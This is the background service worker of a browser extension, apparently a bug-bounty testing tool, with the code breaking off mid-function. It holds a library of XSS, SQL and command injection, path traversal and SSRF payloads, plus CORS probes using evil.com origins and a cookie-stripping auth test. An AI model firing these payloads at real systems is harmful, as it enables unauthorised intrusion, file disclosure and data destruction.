/* ═══════════════════════════════════════════════════════════════
   CYBOWARE — Background Service Worker v5
   Adds: script-load capture, cross-tab domain aggregation, auth-state tracking
   ═══════════════════════════════════════════════════════════════ */

const tabHeaders = {};
const capturedRequests = {};
// Domain-wide aggregate: keyed by root domain. Survives tab close, dedups by URL.
// Structure: { 'target.com': { hosts: Set, jsFiles: Map<url, {firstSeen, status, ct, size}>, requests: [], authDetectedAt: timestamp|null } }
const domainAggregate = {};

// ═══ SHARED FUZZER PAYLOAD LIBRARY ═══
// Single source of truth used by both PARAM_FUZZ (URL params) and FUZZ_FORM (form fields).
// The previous code duplicated a tiny subset client-side; that subset silently fell back
// to XSS payloads for any category it didn't know, which made every Proto/NoSQL/Cmd/SSRF/CRLF
// click on form-mode actually fire XSS payloads. Now both code paths look up here.
const FUZZ_PAYLOADS = {
  xss: [
    { p: '<script>alert(1)</script>', check: 'unencoded_html' },
    { p: '"><img src=x onerror=alert(1)>', check: 'unencoded_html' },
    { p: '<svg/onload=alert(1)>', check: 'unencoded_html' },
    { p: 'cyboXSS"onmouseover="alert(1)', check: 'unencoded_attr' },
    { p: '<svg\tonload=alert(1)>', check: 'unencoded_html' },
    { p: '<details open ontoggle=alert(1)>', check: 'unencoded_html' },
    { p: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', check: 'unencoded_html' },
    { p: '%253Csvg%2520onload%253Dalert(1)%253E', check: 'reflected' },
    { p: 'javascript:alert(1)//', check: 'reflected' },
    { p: '<svg onload=\u0061lert(1)>', check: 'unencoded_html' },
  ],
  sqli: [
    { p: "' OR '1'='1", check: 'sqli_error' },
    { p: "1' AND '1'='1", check: 'sqli_error' },
    { p: "' UNION SELECT NULL--", check: 'sqli_error' },
    { p: "1; DROP TABLE--", check: 'sqli_error' },
    { p: "1'/*!50000OR*/'1'='1", check: 'sqli_error' },
    { p: "' uNiOn SeLeCt NULL--", check: 'sqli_error' },
    { p: "%27%20OR%201%3D1--", check: 'sqli_error' },
    { p: "' AND extractvalue(1,concat(0x7e,version()))--", check: 'sqli_error' },
    { p: "' OR SLEEP(4)--", check: 'sqli_blind_time' },
    { p: "'; WAITFOR DELAY '0:0:4'--", check: 'sqli_blind_time' },
    { p: "' || pg_sleep(4)--", check: 'sqli_blind_time' },
    { p: "1; SELECT SLEEP(4)--", check: 'sqli_blind_time' },
  ],
  nosqli: [
    { p: '{"$ne":null}', check: 'nosqli' },
    { p: '{"$gt":""}', check: 'nosqli' },
    { p: "[$ne]=null", check: 'nosqli' },
    { p: "[$gt]=", check: 'nosqli' },
    { p: '{"$where":"sleep(4000)"}', check: 'sqli_blind_time' },
    { p: "';return 'a'=='a' && '", check: 'nosqli' },
  ],
  ssti: [
    { p: '{{7777777*3333333}}', check: 'ssti_eval', expect: '25925920740741' },
    { p: '${9182736+4455667}', check: 'ssti_eval', expect: '13638403' },
    { p: '<%= 8372615*7 %>', check: 'ssti_eval', expect: '58608305' },
    { p: '#{6192837+4}', check: 'ssti_eval', expect: '6192841' },
    { p: '{{config.__class__.__init__.__globals__}}', check: 'reflected' },
    { p: '{{_self.env.display("id")}}', check: 'reflected' },
  ],
  path: [
    { p: '../../../etc/passwd', check: 'file_content' },
    { p: '....//....//etc/passwd', check: 'file_content' },
    { p: '..\\..\\..\\windows\\win.ini', check: 'file_content_win' },
    { p: '../../../etc/passwd%00', check: 'file_content' },
    { p: '%2e%2e/%2e%2e/%2e%2e/etc/passwd', check: 'file_content' },
    { p: '%252e%252e/%252e%252e/etc/passwd', check: 'file_content' },
  ],
  cmdi: [
    { p: ';id', check: 'cmdi' },
    { p: '|id', check: 'cmdi' },
    { p: '||id', check: 'cmdi' },
    { p: '`id`', check: 'cmdi' },
    { p: '$(id)', check: 'cmdi' },
    { p: ';cat /etc/passwd', check: 'file_content' },
    { p: ';sleep 4', check: 'sqli_blind_time' },
    { p: '`sleep 4`', check: 'sqli_blind_time' },
  ],
  ssrf: [
    { p: 'http://169.254.169.254/latest/meta-data/', check: 'ssrf_aws' },
    { p: 'http://metadata.google.internal/computeMetadata/v1/', check: 'ssrf_gcp' },
    { p: 'http://localhost', check: 'ssrf_internal' },
    { p: 'http://127.0.0.1', check: 'ssrf_internal' },
    { p: 'http://[::1]', check: 'ssrf_internal' },
    { p: 'file:///etc/passwd', check: 'file_content' },
    { p: 'gopher://127.0.0.1:6379/_INFO', check: 'reflected' },
    { p: 'http://169.254.169.254@evil.com', check: 'reflected' },
  ],
  proto: [
    { p: '__proto__[admin]=true', check: 'reflected' },
    { p: 'constructor[prototype][admin]=true', check: 'reflected' },
    { p: '__proto__.polluted=true', check: 'reflected' },
  ],
  crlf: [
    { p: '%0d%0aSet-Cookie:cybo=1', check: 'crlf' },
    { p: '%0d%0aX-Cybo-Header:1', check: 'crlf' },
    { p: '%0a%0d%0a%0d<script>alert(1)</script>', check: 'crlf' },
  ],
};

const FUZZ_SIGNATURES = {
  sqliErrors: ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'syntax error', 'unclosed quotation', 'unterminated string', 'SQLSTATE', 'microsoft sql', 'odbc', 'jdbc', 'quoted string not properly terminated'],
  nosqlErrors: ['mongoerror', 'mongoose', 'cast to objectid', 'unknown operator', 'cannot apply $', 'badvalue:', 'syntax error in expression'],
  cmdiSignatures: ['uid=', 'gid=', 'groups=', 'root:x:', '/bin/bash', '/bin/sh', 'daemon:x:', 'www-data', 'volume serial number is'],
  ssrfAwsSig: ['ami-id', 'instance-id', 'iam/', 'security-credentials', 'placement/', 'public-keys/'],
  ssrfGcpSig: ['/computeMetadata/v1/', 'instance/service-accounts/', 'metadata-flavor: google'],
  ssrfInternalSig: ['phpmyadmin', 'redis_version:', 'jenkins', 'spring-boot', 'kibana', '<title>nginx', 'apache/', 'localhost', '127.0.0.1'],
};

// Single source of truth for the per-payload verification logic. Both URL-fuzz and form-fuzz
// call this so the rules don't drift between the two paths.
function evaluateFuzzResult({ check, payload, expect, body, baselineBody, baselineLen, elapsed, baselineTime, status, headers, rawReflected, context }) {
  const sig = FUZZ_SIGNATURES;
  let severity = 'safe', analysis = '', outContext = context || '';

  if (check === 'unencoded_html') {
    const htmlEncoded = body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
    if (rawReflected && !htmlEncoded) {
      const inScript = /<script[^>]*>[^<]*$/i.test(body.slice(0, body.indexOf(payload)));
      if (inScript) { severity = 'high'; analysis = 'Payload reflected UNENCODED inside <script> — XSS!'; }
      else { severity = 'high'; analysis = 'Payload reflected UNENCODED in HTML body — likely XSS!'; }
    } else if (htmlEncoded) { severity = 'safe'; analysis = 'Reflected but HTML-encoded (safe)'; }
    else { severity = 'safe'; analysis = 'Not reflected'; }
  } else if (check === 'unencoded_attr') {
    if (rawReflected && outContext.includes('"') && !body.includes(payload.replace(/"/g, '&quot;'))) {
      severity = 'high'; analysis = 'Quote character reflected unencoded — attribute breakout possible';
    } else { severity = rawReflected ? 'low' : 'safe'; analysis = rawReflected ? 'Reflected but quotes encoded' : 'Not reflected'; }
  } else if (check === 'ssti_eval') {
    const evalRegex = new RegExp('(?<![0-9a-fA-F])' + expect + '(?![0-9a-fA-F])');
    const evalMatch = evalRegex.exec(body);
    if (evalMatch && !rawReflected) {
      const surrounding = body.slice(Math.max(0, evalMatch.index - 40), Math.min(body.length, evalMatch.index + expect.length + 40));
      const inHex = /[0-9a-f]{12,}/i.test(surrounding);
      const inHash = /sha|hash|key|token|id.*=.*[0-9a-f]/i.test(surrounding);
      const inBaseline = baselineBody && baselineBody.includes(expect);
      if (inHex || inHash || inBaseline) { severity = 'safe'; analysis = inBaseline ? 'Number already present in baseline response — false positive' : 'Number found but inside hex/hash/ID string — false positive'; }
      else { severity = 'high'; analysis = 'Template expression EVALUATED — ' + payload + ' = ' + expect + '!'; outContext = surrounding; }
    } else if (rawReflected) { severity = 'safe'; analysis = 'Literal syntax echoed back (not evaluated) — no template engine processed it'; }
    else { severity = 'safe'; analysis = 'Not reflected, not evaluated'; }
  } else if (check === 'sqli_error') {
    const bodyLower = body.toLowerCase();
    const errorFound = sig.sqliErrors.find(e => bodyLower.includes(e));
    const lenDiff = Math.abs(body.length - baselineLen);
    const errorInBaseline = errorFound && baselineBody.toLowerCase().includes(errorFound);
    if (errorFound && !errorInBaseline) {
      severity = 'high'; analysis = 'SQL error detected: "' + errorFound + '"';
      const errIdx = bodyLower.indexOf(errorFound);
      outContext = body.slice(Math.max(0, errIdx - 40), Math.min(body.length, errIdx + errorFound.length + 80));
    } else if (errorFound && errorInBaseline) { severity = 'safe'; analysis = 'SQL-related text found but also present in baseline — likely page content, not injection'; }
    else if (status === 500 && baselineLen > 0 && body !== baselineBody) { severity = 'medium'; analysis = 'Server error (500) on payload — possible SQL injection'; }
    else if (lenDiff > 5000) { severity = 'low'; analysis = 'Significant response size change (' + lenDiff + ' bytes) — investigate'; }
    else { severity = 'safe'; analysis = 'No SQL errors detected'; }
  } else if (check === 'sqli_blind_time') {
    const timeDiff = elapsed - baselineTime;
    if (timeDiff > 3000) { severity = 'high'; analysis = 'Response delayed ' + (elapsed/1000).toFixed(1) + 's (baseline ' + (baselineTime/1000).toFixed(1) + 's) — TIME-BASED BLIND SQLi!'; }
    else if (timeDiff > 1500) { severity = 'medium'; analysis = 'Slight delay ' + (elapsed/1000).toFixed(1) + 's (baseline ' + (baselineTime/1000).toFixed(1) + 's) — investigate'; }
    else { severity = 'safe'; analysis = 'No delay (' + (elapsed/1000).toFixed(1) + 's)'; }
  } else if (check === 'file_content' || check === 'file_content_win') {
    const fileIndicators = check === 'file_content'
      ? ['root:', '/bin/bash', '/bin/sh', 'daemon:', 'nobody:']
      : ['[extensions]', '[fonts]', '[mci extensions]'];
    const found = fileIndicators.find(f => body.includes(f));
    if (found) {
      severity = 'high'; analysis = 'File content detected: "' + found + '" — path traversal confirmed!';
      const fIdx = body.indexOf(found);
      outContext = body.slice(Math.max(0, fIdx - 20), Math.min(body.length, fIdx + 100));
    } else if (rawReflected) { severity = 'safe'; analysis = 'Path reflected in page (e.g. search query) but no file content — false positive'; }
    else { severity = 'safe'; analysis = 'Not reflected, no file content'; }
  } else if (check === 'nosqli') {
    const bodyLower = body.toLowerCase();
    const errFound = sig.nosqlErrors.find(e => bodyLower.includes(e));
    const errInBaseline = errFound && baselineBody.toLowerCase().includes(errFound);
    const lenChange = Math.abs(body.length - baselineLen);
    if (errFound && !errInBaseline) {
      severity = 'high'; analysis = 'NoSQL error: "' + errFound + '"';
      const idx = bodyLower.indexOf(errFound);
      outContext = body.slice(Math.max(0, idx - 40), Math.min(body.length, idx + errFound.length + 80));
    } else if (lenChange > 5000 && status === 200) { severity = 'medium'; analysis = 'Response length changed by ' + lenChange + ' bytes (auth bypass via NoSQL operator possible) — compare manually'; }
    else { severity = 'safe'; analysis = 'No NoSQL evidence detected'; }
  } else if (check === 'cmdi') {
    const found = sig.cmdiSignatures.find(s => body.includes(s) && !baselineBody.includes(s));
    if (found) {
      severity = 'high'; analysis = 'Command output signature "' + found + '" — command injection confirmed!';
      const idx = body.indexOf(found);
      outContext = body.slice(Math.max(0, idx - 30), Math.min(body.length, idx + 150));
    } else { severity = 'safe'; analysis = 'No command output detected'; }
  } else if (check === 'ssrf_aws') {
    const found = sig.ssrfAwsSig.find(s => body.includes(s));
    if (found) { severity = 'high'; analysis = 'AWS metadata reached: "' + found + '" — SSRF to instance metadata!'; outContext = body.slice(0, 300); }
    else if (body.length > 100 && body.length !== baselineLen) { severity = 'medium'; analysis = 'Response differs from baseline — possible SSRF, verify manually'; }
    else { severity = 'safe'; analysis = 'No metadata signature'; }
  } else if (check === 'ssrf_gcp') {
    const found = sig.ssrfGcpSig.find(s => body.toLowerCase().includes(s.toLowerCase()));
    if (found) { severity = 'high'; analysis = 'GCP metadata signal: "' + found + '" — SSRF possible'; outContext = body.slice(0, 300); }
    else { severity = 'safe'; analysis = 'No GCP metadata signal'; }
  } else if (check === 'ssrf_internal') {
    const found = sig.ssrfInternalSig.find(s => body.toLowerCase().includes(s));
    if (found && !baselineBody.toLowerCase().includes(found)) {
      severity = 'medium'; analysis = 'Internal-service signature "' + found + '" appeared (not in baseline) — possible SSRF';
      const idx = body.toLowerCase().indexOf(found);
      outContext = body.slice(Math.max(0, idx - 40), Math.min(body.length, idx + 200));
    } else { severity = 'safe'; analysis = 'No internal-service signal'; }
  } else if (check === 'crlf') {
    const setCookieReflected = headers && headers.get('set-cookie')?.includes('cybo=1');
    const customReflected = headers && headers.get('x-cybo-header');
    if (setCookieReflected || customReflected) {
      severity = 'high'; analysis = 'CRLF injected into response headers — header injection confirmed!';
      outContext = 'set-cookie: ' + (headers.get('set-cookie') || '') + '\nx-cybo-header: ' + (customReflected || '');
    } else { severity = 'safe'; analysis = 'No CRLF reflection in response headers'; }
  } else {
    // 'reflected' or unknown — generic reflection check
    severity = rawReflected ? 'low' : 'safe';
    analysis = rawReflected ? 'Reflected (manual review needed)' : 'Not reflected';
  }
  return { severity, analysis, context: outContext };
}

// Helper: extract eTLD+1 from any hostname
function getRootDomain(hostname) {
  if (!hostname) return '';
  // Strip port
  hostname = hostname.replace(/:\d+$/, '');
  // IPs return as-is
  if (/^\d+\.\d+\.\d+\.\d+$/.test(hostname)) return hostname;
  if (/^\[.*\]$/.test(hostname)) return hostname;
  const parts = hostname.split('.');
  if (parts.length <= 2) return hostname;
  // Common 2-part TLDs (co.uk, com.au, etc.) — best-effort
  const twoPartTlds = new Set(['co.uk', 'co.jp', 'co.kr', 'co.za', 'com.au', 'com.br', 'com.cn', 'org.uk', 'ac.uk', 'gov.uk', 'net.au']);
  const last2 = parts.slice(-2).join('.');
  if (twoPartTlds.has(last2)) return parts.slice(-3).join('.');
  return parts.slice(-2).join('.');
}

function aggregateRequest(d, kind) {
  let host;
  try { host = new URL(d.url).hostname; } catch { return; }
  const root = getRootDomain(host);
  if (!root) return;
  if (!domainAggregate[root]) domainAggregate[root] = { hosts: {}, jsFiles: {}, endpoints: {}, requests: [], authDetectedAt: null, firstSeen: Date.now() };
  const agg = domainAggregate[root];
  agg.hosts[host] = (agg.hosts[host] || 0) + 1;

  // Track JS files specifically — these are gold for hunters
  if (kind === 'script' || /\.js(\?|$)/i.test(d.url)) {
    if (!agg.jsFiles[d.url]) agg.jsFiles[d.url] = { firstSeen: Date.now(), status: d.statusCode || null, ct: '', size: 0, scanned: false };
    else if (d.statusCode) agg.jsFiles[d.url].status = d.statusCode;
  }
  // Track XHR/fetch endpoints (deduped by path-with-method)
  if (kind === 'xhr' || kind === 'fetch') {
    let pathKey;
    try { const u = new URL(d.url); pathKey = (d.method || 'GET') + ' ' + u.hostname + u.pathname; } catch { pathKey = d.url; }
    if (!agg.endpoints[pathKey]) agg.endpoints[pathKey] = { url: d.url, method: d.method || 'GET', count: 0, lastStatus: null, firstSeen: Date.now() };
    agg.endpoints[pathKey].count++;
    if (d.statusCode) agg.endpoints[pathKey].lastStatus = d.statusCode;
  }
  // Cap total request log per domain
  agg.requests.push({ url: d.url, method: d.method || 'GET', kind, status: d.statusCode || null, ts: Date.now(), tabId: d.tabId });
  if (agg.requests.length > 1000) agg.requests = agg.requests.slice(-1000);
}

// ═══ SERVICE WORKER PERSISTENCE ═══
chrome.storage.session?.get(['capturedRequests', 'domainAggregate'], (d) => {
  if (d.capturedRequests) Object.assign(capturedRequests, d.capturedRequests);
  if (d.domainAggregate) Object.assign(domainAggregate, d.domainAggregate);
});
let persistTimer = null;
function persistRequests() {
  // Throttle persistence — busy pages can fire dozens of requests/sec
  if (persistTimer) return;
  persistTimer = setTimeout(() => {
    try { chrome.storage.session?.set({ capturedRequests, domainAggregate }); } catch {}
    persistTimer = null;
  }, 500);
}

chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: true });

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({ id: 'cyboware-scan', title: 'Cyboware: Scan this page', contexts: ['page'] });
  chrome.contextMenus.create({ id: 'cyboware-lookup', title: 'Cyboware: Lookup "%s"', contexts: ['selection'] });
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === 'cyboware-scan') chrome.sidePanel.open({ tabId: tab.id });
});

// Auth detection helper — when a Set-Cookie with auth-like name appears, mark domain
const AUTH_COOKIE_PATTERN = /^(session|sess|sid|ssid|token|auth|jwt|access|connect\.sid|PHPSESSID|JSESSIONID|_session|ASP\.NET_SessionId|laravel_session|__Host-|__Secure-|_identity|remember|user_session)/i;
function checkAuthDetection(d) {
  if (d.type !== 'main_frame' && d.type !== 'xmlhttprequest' && d.type !== 'fetch') return;
  let host;
  try { host = new URL(d.url).hostname; } catch { return; }
  const root = getRootDomain(host);
  if (!root || !domainAggregate[root] || domainAggregate[root].authDetectedAt) return;
  for (const h of (d.responseHeaders || [])) {
    if (h.name.toLowerCase() === 'set-cookie') {
      const cookieName = (h.value || '').split('=')[0];
      if (cookieName && AUTH_COOKIE_PATTERN.test(cookieName) && /HttpOnly|Secure/i.test(h.value)) {
        domainAggregate[root].authDetectedAt = Date.now();
        domainAggregate[root].authCookie = cookieName;
        persistRequests();
        return;
      }
    }
  }
}

// Capture main-frame, script, sub_frame, XHR/fetch — everything useful for hunting
chrome.webRequest.onHeadersReceived.addListener(
  (d) => {
    if (d.tabId < 0) return;
    if (d.type === 'main_frame') {
      tabHeaders[d.tabId] = { url: d.url, statusCode: d.statusCode, responseHeaders: d.responseHeaders || [] };
      aggregateRequest(d, 'main_frame');
      checkAuthDetection(d);
    }
    if (d.type === 'sub_frame') {
      aggregateRequest(d, 'sub_frame');
    }
    if (d.type === 'script') {
      aggregateRequest(d, 'script');
    }
    if (d.type === 'xmlhttprequest' || d.type === 'fetch') {
      if (!capturedRequests[d.tabId]) capturedRequests[d.tabId] = [];
      const ex = capturedRequests[d.tabId].find(r => r.requestId === d.requestId);
      if (ex) { ex.statusCode = d.statusCode; ex.responseHeaders = d.responseHeaders; }
      else {
        capturedRequests[d.tabId].push({ requestId: d.requestId, url: d.url, method: d.method || 'GET', statusCode: d.statusCode, responseHeaders: d.responseHeaders || [], timestamp: Date.now() });
      }
      if (capturedRequests[d.tabId].length > 200) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-200);
      aggregateRequest(d, d.type === 'fetch' ? 'fetch' : 'xhr');
      checkAuthDetection(d);
      persistRequests();
    }
  },
  { urls: ['<all_urls>'] }, ['responseHeaders']
);

chrome.webRequest.onBeforeRequest.addListener(
  (d) => {
    if (d.tabId < 0) return;
    // Aggregate non-XHR types here too, since onHeadersReceived may fire late or not at all (cancelled, etc.)
    if (d.type === 'script' || d.type === 'sub_frame' || d.type === 'main_frame') {
      aggregateRequest(d, d.type === 'main_frame' ? 'main_frame' : d.type);
      return;
    }
    if (d.type !== 'xmlhttprequest' && d.type !== 'fetch') return;
    if (!capturedRequests[d.tabId]) capturedRequests[d.tabId] = [];
    if (!capturedRequests[d.tabId].some(r => r.requestId === d.requestId)) {
      const entry = { requestId: d.requestId, url: d.url, method: d.method || 'GET', timestamp: Date.now() };
      if (d.requestBody) {
        if (d.requestBody.formData) entry.body = Object.entries(d.requestBody.formData).map(([k,v]) => `${k}=${v}`).join('&');
        else if (d.requestBody.raw?.length) {
          try { entry.body = new TextDecoder().decode(new Uint8Array(d.requestBody.raw[0].bytes)); } catch {}
        }
      }
      capturedRequests[d.tabId].push(entry);
      if (capturedRequests[d.tabId].length > 200) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-200);
      persistRequests();
    }
  },
  { urls: ['<all_urls>'] }, ['requestBody']
);

chrome.webRequest.onSendHeaders.addListener(
  (d) => {
    if (d.tabId < 0 || (d.type !== 'xmlhttprequest' && d.type !== 'fetch' && d.type !== 'main_frame')) return;
    if (d.type === 'main_frame') {
      if (tabHeaders[d.tabId]) tabHeaders[d.tabId].requestHeaders = d.requestHeaders || [];
      return;
    }
    if (!capturedRequests[d.tabId]) return;
    const ex = capturedRequests[d.tabId].find(r => r.requestId === d.requestId);
    if (ex) ex.requestHeaders = d.requestHeaders;
  },
  { urls: ['<all_urls>'] }, ['requestHeaders']
);

chrome.tabs.onRemoved.addListener((id) => { delete tabHeaders[id]; delete capturedRequests[id]; persistRequests(); });

// Message handler
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  const h = handlers[msg.type];
  if (h) { h(msg, sender, sendResponse); return true; }
});

const handlers = {
  GET_HEADERS: (msg, _, sr) => sr({ headers: tabHeaders[msg.tabId] || null }),
  GET_CAPTURED_REQUESTS: (msg, _, sr) => sr({ requests: capturedRequests[msg.tabId] || [] }),

  // Domain-wide aggregate (cross-tab): all hosts, JS files, endpoints seen for this root domain
  GET_DOMAIN_AGGREGATE: (msg, _, sr) => {
    const agg = domainAggregate[msg.domain];
    if (!agg) { sr({ ok: false, error: 'No data captured for this domain yet. Browse around first.' }); return; }
    sr({
      ok: true,
      domain: msg.domain,
      hosts: agg.hosts,
      jsFiles: agg.jsFiles,
      endpoints: agg.endpoints,
      totalRequests: agg.requests.length,
      authDetectedAt: agg.authDetectedAt,
      authCookie: agg.authCookie,
      firstSeen: agg.firstSeen,
    });
  },

  // Bulk-scan all JS files captured for a domain. Fetches each, runs secret scanner / endpoint extraction.
  SCAN_ALL_JS: async (msg, _, sr) => {
    const agg = domainAggregate[msg.domain];
    if (!agg) { sr({ ok: false, error: 'No JS captured. Browse around first.' }); return; }
    const urls = Object.keys(agg.jsFiles).filter(u => !agg.jsFiles[u].scanned);
    const results = [];
    // Limit to 30 unscanned files per run to avoid hammering
    const batch = urls.slice(0, 30);
    for (let i = 0; i < batch.length; i += 4) {
      const slice = batch.slice(i, i + 4);
      const fetched = await Promise.all(slice.map(async url => {
        try {
          const r = await fetch(url, { credentials: 'include', signal: AbortSignal.timeout(8000) });
          if (!r.ok) return { url, error: 'HTTP ' + r.status };
          const text = await r.text();
          agg.jsFiles[url].scanned = true;
          agg.jsFiles[url].size = text.length;
          return { url, text, size: text.length };
        } catch (e) { return { url, error: (e.message||'').slice(0, 80) }; }
      }));
      fetched.forEach(f => results.push(f));
    }
    persistRequests();
    sr({ ok: true, scanned: results.filter(r => r.text).length, errors: results.filter(r => r.error).length, files: results, remaining: urls.length - batch.length });
  },

  CLEAR_DOMAIN_AGGREGATE: (msg, _, sr) => {
    if (msg.domain) delete domainAggregate[msg.domain];
    else for (const k of Object.keys(domainAggregate)) delete domainAggregate[k];
    persistRequests();
    sr({ ok: true });
  },

  CLEAR_CAPTURED_REQUESTS: (msg, _, sr) => {
    if (msg.tabId && capturedRequests[msg.tabId]) {
      capturedRequests[msg.tabId] = [];
      persistRequests();
    }
    sr({ ok: true });
  },

  FETCH_URL: async (msg, _, sr) => {
    try {
      const opts = { method: msg.method || 'GET', headers: msg.headers || {}, credentials: 'include' };
      if (msg.body) opts.body = msg.body;
      const res = await fetch(msg.url, opts);
      const text = await res.text();
      const rh = {}; res.headers.forEach((v, k) => { rh[k] = v; });
      sr({ ok: true, status: res.status, statusText: res.statusText, text, headers: rh });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  FETCH_JS: async (msg, _, sr) => {
    try { const r = await fetch(msg.url, { credentials: 'include' }); sr({ ok: true, text: await r.text() }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  ENUM_SUBDOMAINS: async (msg, _, sr) => {
    const domain = msg.domain;
    const sources = [];
    const subs = new Set();
    // 1. crt.sh
    try {
      const r = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`, { signal: AbortSignal.timeout(10000) });
      const text = await r.text();
      if (r.ok && !text.trim().startsWith('<')) {
        try {
          const d = JSON.parse(text);
          d.map(e => e.name_value).flatMap(n => n.split('\n')).forEach(s => { if (s && !s.startsWith('*')) subs.add(s.toLowerCase()); });
          sources.push('crt.sh');
        } catch {}
      }
    } catch {}
    // 2. HackerTarget
    try {
      const r2 = await fetch(`https://api.hackertarget.com/hostsearch/?q=${encodeURIComponent(domain)}`, { signal: AbortSignal.timeout(10000) });
      const text2 = await r2.text();
      if (r2.ok && !text2.includes('error') && !text2.startsWith('<')) {
        text2.trim().split('\n').map(line => line.split(',')[0]).filter(Boolean).forEach(s => subs.add(s.toLowerCase()));
        sources.push('hackertarget');
      }
    } catch {}
    // 3. Wayback Machine — historical subdomains seen in archived URLs
    try {
      const r3 = await fetch(`https://web.archive.org/cdx/search/cdx?url=*.${encodeURIComponent(domain)}/*&output=json&fl=original&collapse=urlkey&limit=500`, { signal: AbortSignal.timeout(10000) });
      const j = await r3.json();
      if (Array.isArray(j) && j.length > 1) {
        // First row is header
        for (let i = 1; i < j.length; i++) {
          try {
            const u = new URL(j[i][0]);
            if (u.hostname.endsWith('.' + domain) || u.hostname === domain) subs.add(u.hostname.toLowerCase());
          } catch {}
        }
        sources.push('wayback');
      }
    } catch {}

    if (!subs.size) { sr({ ok: false, error: 'All sources failed (crt.sh, HackerTarget, Wayback). Try again later.' }); return; }
    const sorted = [...subs].sort();
    sr({ ok: true, source: sources.join('+'), subdomains: sorted });
  },

  WAYBACK_LOOKUP: async (msg, _, sr) => {
    try {
      const r = await fetch(`https://web.archive.org/cdx/search/cdx?url=${encodeURIComponent(msg.url)}&output=json&limit=30&fl=timestamp,original,statuscode,mimetype`);
      const d = await r.json();
      sr({ ok: true, snapshots: d.slice(1) });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  TEST_CORS: async (msg, _, sr) => {
    const results = [];
    const targetUrl = new URL(msg.url);
    const targetDomain = targetUrl.hostname;
    const targetOrigin = targetUrl.origin;
    const origins = [
      { origin: 'https://evil.com', label: 'External domain' },
      { origin: 'null', label: 'Null origin' },
      { origin: targetOrigin, label: 'Same origin (baseline)' },
      { origin: `https://sub.${targetDomain}`, label: 'Subdomain reflection' },
      { origin: `https://${targetDomain}.evil.com`, label: 'Domain suffix bypass' },
      { origin: `https://evil${targetDomain}`, label: 'Domain prefix bypass' },
      { origin: `https://evil.com.${targetDomain}`, label: 'Subdomain injection' },
      { origin: `https://${targetDomain}_.evil.com`, label: 'Underscore bypass' },
      { origin: 'https://localhost', label: 'Localhost' },
      { origin: `http://${targetDomain}`, label: 'HTTP downgrade' },
    ];
    // Also test preflight (OPTIONS)
    let preflightResult = null;
    try {
      const pr = await fetch(msg.url, { method: 'OPTIONS', headers: { 'Origin': 'https://evil.com', 'Access-Control-Request-Method': 'POST', 'Access-Control-Request-Headers': 'Authorization' }, signal: AbortSignal.timeout(5000) });
      const prAcao = pr.headers.get('access-control-allow-origin');
      const prMethods = pr.headers.get('access-control-allow-methods');
      const prHeaders = pr.headers.get('access-control-allow-headers');
      const prMaxAge = pr.headers.get('access-control-max-age');
      preflightResult = { status: pr.status, acao: prAcao, methods: prMethods, headers: prHeaders, maxAge: prMaxAge };
    } catch (e) { preflightResult = { error: e.message }; }

    let varyOrigin = null;  // Captured once from the baseline same-origin response

    for (const { origin, label } of origins) {
      try {
        const r = await fetch(msg.url, { headers: { 'Origin': origin }, signal: AbortSignal.timeout(5000) });
        const acao = r.headers.get('access-control-allow-origin');
        const acac = r.headers.get('access-control-allow-credentials');
        const vary = r.headers.get('vary') || '';
        if (label === 'Same origin (baseline)') varyOrigin = /\borigin\b/i.test(vary);
        const reflected = acao === origin;
        const wildcard = acao === '*';
        const vuln = reflected && (label !== 'Same origin (baseline)');
        const wildcardOnly = wildcard && !reflected && (label !== 'Same origin (baseline)');
        const critical = vuln && acac === 'true';
        const wildcardWithCreds = wildcard && acac === 'true'; // impossible per spec but servers misconfigure
        results.push({ origin, label, acao, acac, vary, status: r.status, reflected, wildcard, vuln, critical, wildcardOnly, wildcardWithCreds });
      } catch (e) { results.push({ origin, label, error: e.message }); }
    }
    // Cache-poisoning hint: ACAO present but no Vary: Origin — a shared cache could serve the wrong response
    const anyAcao = results.some(r => r.acao);
    const cachePoisonHint = anyAcao && varyOrigin === false;
    sr({ ok: true, results, preflight: preflightResult, varyOrigin, cachePoisonHint });
  },

  REPLAY_REQUEST: async (msg, _, sr) => {
    try {
      const opts = { method: msg.method || 'GET', headers: msg.headers || {}, credentials: msg.omitCredentials ? 'omit' : 'include' };
      if (msg.body) opts.body = msg.body;
      const r = await fetch(msg.url, opts);
      const text = await r.text();
      const rh = {}; r.headers.forEach((v, k) => { rh[k] = v; });
      sr({ ok: true, status: r.status, statusText: r.statusText, text, headers: rh });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  TAKE_SCREENSHOT: async (msg, _, sr) => {
    try { sr({ ok: true, dataUrl: await chrome.tabs.captureVisibleTab(null, { format: 'png' }) }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  GET_COOKIES: async (msg, _, sr) => {
    try { sr({ ok: true, cookies: await chrome.cookies.getAll({ domain: msg.domain }) }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  DELETE_COOKIE: async (msg, _, sr) => {
    try { await chrome.cookies.remove({ url: msg.url, name: msg.name }); sr({ ok: true }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  TEST_AUTH: async (msg, _, sr) => {
    try {
      const domain = msg.domain;
      const url = msg.url;
      const baseline = await fetch(url, { credentials: 'include', redirect: 'manual', signal: AbortSignal.timeout(6000) });
      const baseStatus = baseline.status;
      const baseLen = (await baseline.text()).length;
      const allCookies = await chrome.cookies.getAll({ domain });
      // Remove all
      for (const c of allCookies) {
        const cUrl = (c.secure ? 'https://' : 'http://') + c.domain.replace(/^\./, '') + c.path;
        try { await chrome.cookies.remove({ url: cUrl, name: c.name }); } catch {}
      }
      const noCookieRes = await fetch(url, { credentials: 'include', redirect: 'manual', signal: AbortSignal.timeout(6000) });
      const noStatus = noCookieRes.status;
      const noLen = (await noCookieRes.text()).length;
      // Restore all
